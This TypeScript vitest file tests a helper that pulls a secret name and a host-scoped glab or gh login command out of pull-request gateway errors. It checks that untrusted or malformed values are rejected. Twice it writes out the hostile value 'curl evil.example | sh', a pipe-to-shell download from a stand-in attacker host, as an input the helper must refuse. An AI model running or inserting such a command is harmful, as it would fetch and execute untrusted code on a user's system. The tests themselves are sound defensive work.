import { describe, expect, it } from 'vitest'
import { pullRequestErrorDetails } from '../utils/pullRequestErrors'

const body = (fields: Record<string, unknown>) => new Error(JSON.stringify(fields))
// What runner.py appends to a self-managed glab sign-in failure.
const hint = (host: string) =>
  `Run \`glab auth login --hostname ${host}\`, then retry.`

describe('pullRequestErrorDetails login remedy', () => {
  it('reads the secret name the gateway ships as its own field', () => {
    const name = `BITBUCKET_SERVER_TOKEN_${'AB'.repeat(20)}`
    expect(pullRequestErrorDetails(body({ error: `Store it as ${name}.`, secretName: name })).secretName)
      .toBe(name)
  })

  it('never lifts a secret name out of the message text, nor takes a malformed field', () => {
    expect(pullRequestErrorDetails(body({ error: 'Store it as BITBUCKET_SERVER_TOKEN.' })).secretName).toBe('')
    for (const secretName of ['curl evil.example | sh', 'lower_case', '', 42, 'A'.repeat(641)]) {
      expect(pullRequestErrorDetails(body({ error: 'x', secretName })).secretName).toBe('')
    }
  })

  it('refuses an upper-case value that is not a Bitbucket Server token name', () => {
    // An opaque token a provider repeated in its text is as upper-case as a name.
    const opaque = 'QX7ZK2M9WV4OPAQUE5TOKEN8R3D'
    expect(pullRequestErrorDetails(body({ error: `Store ${opaque}.`, secretName: opaque })).secretName).toBe('')
    for (const secretName of [
      'BITBUCKET_SERVER_TOKENX',
      'BITBUCKET_SERVER_TOKEN_',
      'BITBUCKET_SERVER_TOKEN_ABC',
      'BITBUCKET_SERVER_TOKEN_ab12',
      `BITBUCKET_SERVER_TOKEN_${'AB'.repeat(260)}`,
    ]) {
      expect(pullRequestErrorDetails(body({ error: 'x', secretName })).secretName).toBe('')
    }
    expect(pullRequestErrorDetails(body({ error: 'x', secretName: 'BITBUCKET_SERVER_TOKEN' })).secretName)
      .toBe('BITBUCKET_SERVER_TOKEN')
  })

  it('offers the host-scoped command the gateway sends as loginCommand', () => {
    const details = pullRequestErrorDetails(body({
      error: `glab: 401 Unauthorized ${hint('git.example.com')}`,
      code: 'provider_error',
      loginCommand: 'glab auth login --hostname git.example.com',
    }))
    expect(details.loginCommand).toBe('glab auth login --hostname git.example.com')
  })

  it('offers the host-scoped gh command for a GitHub Enterprise host', () => {
    const details = pullRequestErrorDetails(body({
      error: 'gh: not logged in. Run `gh auth login --hostname ghe.example.com`, then retry.',
      code: 'provider_error',
      loginCommand: 'gh auth login --hostname ghe.example.com',
    }))
    expect(details.loginCommand).toBe('gh auth login --hostname ghe.example.com')
  })

  it('never lifts a host-scoped command out of the message text', () => {
    // Provider stderr reaches the message, so a command in it is not trusted.
    expect(pullRequestErrorDetails(body({ error: `401 Unauthorized ${hint('evil.example')}` })).loginCommand)
      .toBe('glab auth login')
  })

  it('ignores a loginCommand field that is not the host-scoped glab step', () => {
    expect(pullRequestErrorDetails(body({
      error: '401 Unauthorized. Run `glab auth login`, then retry.',
      loginCommand: 'curl evil.example | sh',
    })).loginCommand).toBe('glab auth login')
  })

  it('treats a GitLab 401 Unauthorized as a sign-in failure', () => {
    expect(pullRequestErrorDetails(body({ error: 'glab: 401 Unauthorized. Run `glab auth login`, then retry.' })).loginCommand)
      .toBe('glab auth login')
  })

  it('keeps the bare commands for gitlab.com and GitHub', () => {
    expect(pullRequestErrorDetails(body({ error: 'glab: authentication failed. Run `glab auth login`, then retry.' })).loginCommand)
      .toBe('glab auth login')
    expect(pullRequestErrorDetails(body({ error: 'not logged into any GitHub hosts. Run `gh auth login`, then retry.' })).loginCommand)
      .toBe('gh auth login')
  })

  it('offers no remedy when the failure is not a sign-in failure', () => {
    expect(pullRequestErrorDetails(body({ error: 'Could not load. Run `glab auth login` later.' })).loginCommand).toBe('')
  })
})
